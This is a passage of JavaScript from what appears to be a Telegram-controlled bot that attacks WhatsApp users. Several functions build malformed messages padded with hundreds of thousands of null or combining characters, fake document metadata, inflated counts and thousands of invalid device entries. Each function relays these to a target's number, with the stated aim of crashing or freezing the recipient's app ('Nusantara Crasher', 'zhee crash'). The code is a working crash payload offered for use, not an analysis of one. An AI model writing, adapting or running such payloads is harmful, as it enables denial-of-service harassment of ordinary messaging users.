for (let i = 0; i < 1999; i++) { // Sesuaikan jumlah section
let largeText = 'ྀི'.repeat(5999); // Pesan besar

let deepNested = {
title: `Section ${i + 1}`,
highlight_label: `Highlight ${i + 1}`,
rows: [{
title: largeText,
id: `id${i}`,
subrows: [
{
title: 'Nested row 1',
id: `nested_id1_${i}`,
subsubrows: [
{
title: 'Deep Nested row 1',
id: `deep_nested_id1_${i}`
},
{
title: 'Deep Nested row 2',
id: `deep_nested_id2_${i}`
}
]
},
{
title: 'Nested row 2',
id: `nested_id2_${i}`
}
]
}]
};

sections.push(deepNested);
}

let listMessage = {
title: "𝙾𝚅𝙴𝚁𝙻𝙾𝙰𝙳",
sections: sections
};

let msg = generateWAMessageFromContent(Target, {
viewOnceMessage: {
message: {
"messageContextInfo": {
"deviceListMetadata": {},
"deviceListMetadataVersion": 2
},
interactiveMessage: proto.Message.InteractiveMessage.create({
contextInfo: {
mentionedJid: [Target],
isForwarded: true,
forwardingScore: 999
},
body: proto.Message.InteractiveMessage.Body.create({
text: "𝐙‌𝐗‌𝐎 ⿻‌𝐔𝐈⿻‌" + "ꦾ".repeat(89999)
}),
footer: proto.Message.InteractiveMessage.Footer.create({
buttonParamsJson: JSON.stringify(listMessage)
}),
header: proto.Message.InteractiveMessage.Header.create({
buttonParamsJson: JSON.stringify(listMessage),
subtitle: "𝐎𝐯𝐞𝐥𝐨𝐚𝐝‌" + "ྀི".repeat(4999), 
hasMediaAttachment: false
}),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
  buttons: [
{
name: "single_select",
buttonParamsJson: "JSON.stringify(listMessage)"
},
{
name: "payment_method",
buttonParamsJson: "{}"
},
{
name: "call_permission_request",
buttonParamsJson: "{}"
},
{
name: "single_select",
buttonParamsJson: "JSON.stringify(listMessage)"
},
{
name: "mpm",
buttonParamsJson: "JSON.stringify(listMessage)"
}, 
{
name: "mpm",
buttonParamsJson: "JSON.stringify(listMessage)"
}, 
{
name: "mpm",
buttonParamsJson: "JSON.stringify(listMessage)"
}, 
{
name: "mpm",
buttonParamsJson: "{}"
}, 
{
name: "mpm",
buttonParamsJson: "{}"
}, 
{
name: "mpm",
buttonParamsJson: "{}"
}, 
{
name: "mpm",
buttonParamsJson: "{}"
}

]
})
})
}
}
}, {});

await zephy.relayMessage(Target, msg.message, {
messageId: msg.key.id
});

console.log(`BluzeAJ FloodUi To ${Target}`);
}
async function OverloadCursor(target, ptcp = true) {
    const virtex = [{
            attrs: {
                biz_bot: "1"
            },
            tag: "bot",
        },
        {
            attrs: {},
            tag: "biz",
        },
    ];
    let messagePayload = {
        viewOnceMessage: {
            message: {
                listResponseMessage: {
                    title: "Nusantara Crasher" + "ꦽ".repeat(16999),
                    listType: 2,
                    singleSelectReply: {
                        selectedRowId: "😹",
                    },
                    contextInfo: {
                        virtexId: zephy.generateMessageTag(),
                        participant: "13135550002@s.whatsapp.net",
                        mentionedJid: ["13135550002@s.whatsapp.net"],
                        quotedMessage: {
                            buttonsMessage: {
                                documentMessage: {
                                    url: "https://mmg.whatsapp.net/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0&mms3=true",
                                    mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                                    fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
                                    fileLength: "9999999999999",
                                    pageCount: 1316134911,
                                    mediaKey: "45P/d5blzDp2homSAvn86AaCzacZvOBYKO8RDkx5Zec=",
                                    fileName: "Z?" + "\u0000".repeat(97770),
                                    fileEncSha256: "LEodIdRH8WvgW6mHqzmPd+3zSR61fXJQMjf3zODnHVo=",
                                    directPath: "/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0",
                                    mediaKeyTimestamp: "1726867151",
                                    contactVcard: true,
                                    jpegThumbnail: tdxlol,
                                },
                                hasMediaAttachment: true,
                                contentText: 'XZCRASHER"👋"',
                                footerText: "|| VCS BY XZHEE ꦽ",
                                buttons: [{
                                        buttonId: "\u0000".repeat(170000),
                                        buttonText: {
                                            displayText: "Ampas?" + "\u0000".repeat(1999),
                                        },
                                        type: 1,
                                    },
                                    {
                                        buttonId: "\u0000".repeat(220000),
                                        buttonText: {
                                            displayText: "Ampas?" + "\u0000".repeat(1999),
                                        },
                                        type: 1,
                                    },
                                    {
                                        buttonId: "\u0000".repeat(220000),
                                        buttonText: {
                                            displayText: "Ampas?" + "\u0000".repeat(1999),
                                        },
                                        type: 1,
                                    },
                                ],
                                viewOnce: true,
                                headerType: 3,
                            },
                        },
                        conversionSource: "porn",
                        conversionData: crypto.randomBytes(16),
                        conversionDelaySeconds: 9999,
                        forwardingScore: 999999,
                        isForwarded: true,
                        quotedAd: {
                            advertiserName: " x ",
                            mediaType: "IMAGE",
                            jpegThumbnail: tdxlol,
                            caption: " x ",
                        },
                        placeholderKey: {
                            remoteJid: "13135550002@s.whatsapp.net",
                            fromMe: false,
                            id: "ABCDEF1234567890",
                        },
                        expiration: -99999,
                        ephemeralSettingTimestamp: Date.now(),
                        ephemeralSharedSecret: crypto.randomBytes(16),
                        entryPointConversionSource: "❤️",
                        entryPointConversionApp: "💛",
                        actionLink: {
                            url: "https://t.me/alantequirasgtps",
                            buttonTitle: "Ampas",
                        },
                        disappearingMode: {
                            initiator: 1,
                            trigger: 2,
                            initiatorDeviceJid: target,
                            initiatedByMe: true,
                        },
                        groupSubject: "😼",
                        parentGroupJid: "😽",
                        trustBannerType: "😾",
                        trustBannerAction: 99999,
                        isSampled: true,
                        externalAdReply: {},
                        featureEligibilities: {
                            cannotBeReactedTo: true,
                            cannotBeRanked: true,
                            canRequestFeedback: true,
                        },
                        forwardedNewsletterMessageInfo: {
                            newsletterJid: "120363274419384848@newsletter",
                            serverMessageId: 1,
                            newsletterName: `@13135550002${"ꥈꥈꥈꥈꥈꥈ".repeat(10)}`,
                            contentType: 3,
                            accessibilityText: "kontol",
                        },
                        statusAttributionType: 2,
                        utm: {
                            utmSource: "utm",
                            utmCampaign: "utm2",
                        },
                    },
                    description: "@13135550002".repeat(2999),
                },
                messageContextInfo: {
                    messageSecret: crypto.randomBytes(32),
                    supportPayload: JSON.stringify({
                        version: 2,
                        is_ai_message: true,
                        should_show_system_message: true,
                        ticket_id: crypto.randomBytes(16),
                    }),
                },
            },
        },
    };
    let sections = [];
    for (let i = 0; i < 1; i++) {
        let largeText = "\u0000".repeat(11999);
        let deepNested = {
            title: `Section ${i + 1}`,
            highlight_label: `Highlight ${i + 1}`,
            rows: [{
                title: largeText,
                id: `\u0000`.repeat(999),
                subrows: [{
                        title: `\u0000`.repeat(999),
                        id: `\u0000`.repeat(999),
                        subsubrows: [{
                                title: `\u0000`.repeat(999),
                                id: `\u0000`.repeat(999),
                            },
                            {
                                title: `\u0000`.repeat(999),
                                id: `\u0000`.repeat(999),
                            },
                        ],
                    },
                    {
                        title: `\u0000`.repeat(999),
                        id: `\u0000`.repeat(999),
                    },
                ],
            }, ],
        };
        sections.push(deepNested);
    }
    let listMessage = {
        title: "𝙾𝚅𝙴𝚁𝙻𝙾𝙰𝙳",
        sections: sections,
    };
    let msg = generateWAMessageFromContent(
        target,
        proto.Message.fromObject({
            viewOnceMessage: {
                message: {
                    messageContextInfo: {
                        deviceListMetadata: {},
                        deviceListMetadataVersion: 2,
                    },
                    interactiveMessage: proto.Message.InteractiveMessage.create({
                        contextInfo: {
                            participant: "0@s.whatsapp.net",
                            remoteJid: "status@broadcast",
                            mentionedJid: [target],
                            isForwarded: true,
                            forwardingScore: 999,
                        },
                        body: proto.Message.InteractiveMessage.Body.create({
                            text: '!Ada Asep Gak?' + "ꦽ".repeat(29999),
                        }),
                        footer: proto.Message.InteractiveMessage.Footer.create({
                            buttonParamsJson: JSON.stringify(listMessage),
                        }),
                        header: proto.Message.InteractiveMessage.Header.create({
                            buttonParamsJson: JSON.stringify(listMessage),
                            subtitle: "zhee crash" + "\u0000".repeat(9999),
                            hasMediaAttachment: false,
                        }),
                        nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                            buttons: [{
                                    name: "single_select",
                                    buttonParamsJson: "JSON.stringify(listMessage)",
                                },
                                {
                                    name: "call_permission_request",
                                    buttonParamsJson: "{}",
                                },
                                {
                                    name: "single_select",
                                    buttonParamsJson: "JSON.stringify(listMessage)",
                                },
                            ],
                        }),
                    }),
                },
            },
        }), {
            userJid: target
        }
    );
    await zephy.relayMessage(target, msg.message, {
        messageId: msg.key.id,
        participant: {
            jid: target
        },
    });
    console.log(`BluzeAJ Payload Button to ${target}`);
    await zephy.relayMessage(target, msg.message, {
        messageId: msg.key.id,
        participant: {
            jid: target
        },
    });
    await zephy.relayMessage(target, messagePayload, {
        additionalNodes: virtex,
        participant: {
            jid: target
        },
    });
    console.log(`BluzeAJ Payload Button to ${target}`);
}
async function newLoaudFast(target, ptcp = true) {
    try {
        let message = {
            viewOnceMessage: {
                message: {
                    messageContextInfo: {
                        deviceListMetadata: {
                            devices: new Array(10000).fill({ id: "device", type: "invalid" }) 
                        },
                        deviceListMetadataVersion: 9999999999, 
                    },
                    interactiveMessage: {
                        contextInfo: {
                            mentionedJid: [target],
                            isForwarded: true,
                            forwardingScore: Infinity, 
                            businessMessageForwardInfo: {
                                businessOwnerJid: target,
                            },
                        },
                        body: {
                            text: "◈", 
                        },
                                    nativeFlowMessage: {
                                      buttons: [
                              {
                              name: "single_select",
                       buttonParamsJson: "",
                           },
                {
                  name: "call_permission_request",
                  buttonParamsJson: "",
                },
                {
                  name: "mpm",
                  buttonParamsJson: "",
                },
                {
                  name: "mpm",
                  buttonParamsJson: "",
                },
                {
                  name: "mpm",
                  buttonParamsJson: "",
                },
                {
                  name: "mpm",
                  buttonParamsJson: "",
                                }
                            ],
                        },
                    },
                },
            },
        };

        await zephy.relayMessage(target, message, {
            participant: { jid: target },
        });
    } catch (err) {
        console.log(err);
    }
}

async function newLoadFast(target, ptcp = true) {
    try {
        let message = {
            viewOnceMessage: {
                message: {
                    messageContextInfo: {
                        deviceListMetadata: {
                            devices: new Array(10000).fill({ id: "device", type: "invalid" }) 
                        },
                        deviceListMetadataVersion: 9999999999, 
                    },
                    interactiveMessage: {
                        contextInfo: {
                            mentionedJid: [target],
                            isForwarded: true,
                            forwardingScore: 9999999, 
                            businessMessageForwardInfo: {
                                businessOwnerJid: target,
                            },
                            quotedMessage: {
                                documentMessage: {
                                    url: "https://mmg.whatsapp.net/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0&mms3=true",
                                    mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                                    fileSha256: "ld5gnmaib+1mBCWrcNmekjB4fHhyjAPOHJ+UMD3uy4k=",
                                    fileEncSha256: "pznYBS1N6gr9RZ66Fx7L3AyLIU2RY5LHCKhxXerJnwQ=",
                                    fileName: "≏ 𝕋𝚁ǟʂн᙭ ≏",
                                    fileLength: "9999999999999", 
                                    pageCount: 9007199254740991, 
                                    directPath: "/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc",
                                    mediaKey: "EZ/XTztdrMARBwsjTuo9hMH5eRvumy+F8mpLBnaxIaQ=",
                                    mediaKeyTimestamp: "1715880173",
                                    mediaType: "presentation",
                                    contactVcard: true,
                                    jpegThumbnail: Buffer.alloc(4096, 0) 
                                }
                            }
                        },
                        body: {
                            text: "≏ 𝕋𝚁ǟʂн᙭ ≏",
                        },
                        nativeFlowMessage: {
                            buttons: [
                                { name: "single_select", buttonParamsJson: "" },
                                { name: "call_permission_request", buttonParamsJson: "" },
                                { name: "mpm", buttonParamsJson: "" },
                                { name: "mpm", buttonParamsJson: "" },
                                { name: "mpm", buttonParamsJson: "" },
                                { name: "mpm", buttonParamsJson: "" }
                            ],
                        },
                    },
                },
            },
        };

        await zephy.relayMessage(target, message, {
            participant: { jid: target },
        });
    } catch (err) {
        console.log(err);
    }
}
async function InvisibleLoadFast(target) {
    try {
        let message = {
            viewOnceMessage: {
                message: {
                    messageContextInfo: {
                        deviceListMetadata: {},
                        deviceListMetadataVersion: 2,
                    },
                    interactiveMessage: {
                        contextInfo: {
                            mentionedJid: [target],
                            isForwarded: true,
                            forwardingScore: 999,
                            businessMessageForwardInfo: {
                                businessOwnerJid: target,
                            },
                        },
                        body: {
                            text: "️X̸̡̢̧̹͔̣̻̜̬̻̘͂͐̓͆̕Z̶̢̫̜̪͇͖͙̓̈́́͜͜ͅ️Ĉ̵̢̢̱̞̻̣͕͈̱̥̤̳͉R̴͇͌̀̆̍̽͝͠ͅ️Ą̵̘̥͉̘͖̱̥̺̿̀̈̒̂̅̀̅̈́̓̏͊͘͝️S̴̨̛͇̺͇͕̟̘͎̗͖̙͍̭̞͇̒͆̀͝Ḩ̶̳̣̮̻̪̜͍̹̭͓͍̳̼̈́̅́̄̍̀͐́̊̽͌̊̂͂͠͝͝ ️N̴̟̬̠̣͍̹̜̠̘̮͎̥̜̳̖̋͋͛̆́̂̀̅̓̕ͅͅI̸̡̛̳͌̉͋͐͒̍ B̴̢̠̋̊͑̈̾̑̊͒͗̽O̸̙͙̺̰͚͎̙͔̦͇͗̒̋͛̄͐̓̽̄͛́͂̀̑̕ͅͅͅ️S̴̨̛͇̺͇͕̟̘͎̗͖̙͍̭̞͇̒͆̀͝️S̴̨̛͇̺͇͕̟̘͎̗͖̙͍̭̞͇̒͆̀͝" + "\u0000".repeat(900000),
                        },
                        nativeFlowMessage: {
                            buttons: [{
                                    name: "single_select",
                                    buttonParamsJson: "",
                                },
                                {
                                    name: "call_permission_request",
                                    buttonParamsJson: "",
                                },
                                {
                                    name: "mpm",
                                    buttonParamsJson: "",
                                },
                                {
                                    name: "mpm",
                                    buttonParamsJson: "",
                                },
                                {
                                    name: "mpm",
                                    buttonParamsJson: "",
                                },
                                {
                                    name: "mpm",
                                    buttonParamsJson: "",
                                },
                            ],
                        },
                    },
                },
            },
        };

        await zephy.relayMessage(target, message, {
            participant: {
                jid: target
            },
        });
    } catch (err) {
        console.log(err);
    }
}
// --- Jalankan Bot ---
bot.launch();
console.log("Telegram bot is running...");